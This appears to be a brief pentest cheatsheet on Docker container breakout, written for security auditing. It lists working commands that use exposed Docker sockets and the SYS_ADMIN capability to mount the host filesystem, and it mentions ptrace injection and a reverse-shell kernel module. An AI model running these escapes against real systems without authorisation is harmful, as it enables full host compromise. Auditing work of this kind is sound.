# docker-vulns-cheatsheet
Cheatsheet for auditing container security

## Breakout
Methods for breaking out of docker containers

### Exposed Sockets

##### TCP
Default docker tcp port is 2375. check with `netstat -tulpn` Verify with `curl localhost:2375/version`

`docker run -it -H tcp://localhost:2375 -v /:/mnt IMAGE bash`

##### Unix
Unix socket is typically mounted at `/var/run/docker.sock`

`docker run -it -H unix:///var/run/docker.sock -v /:/mnt IMAGE bash`

### Privileged Container

##### SYS_ADMIN capability
Check for SYS_ADMIN capability with `capsh --print | grep cap_sys_admin`

Check host disks
`fdisk -l`

mount host disk 
`mount /dev/sda /mnt`

#### SYS_PTRACE capability
Check for SYS_PTRACE capability with `capsh --print | grep cap_sys_ptrace`

check for ptrace process injection

#### SYS_MODULE capability
Check for SYS_MODULE capability with `capsh --print | grep cap_sys_module`

create and insert a reverse-shell kernel module

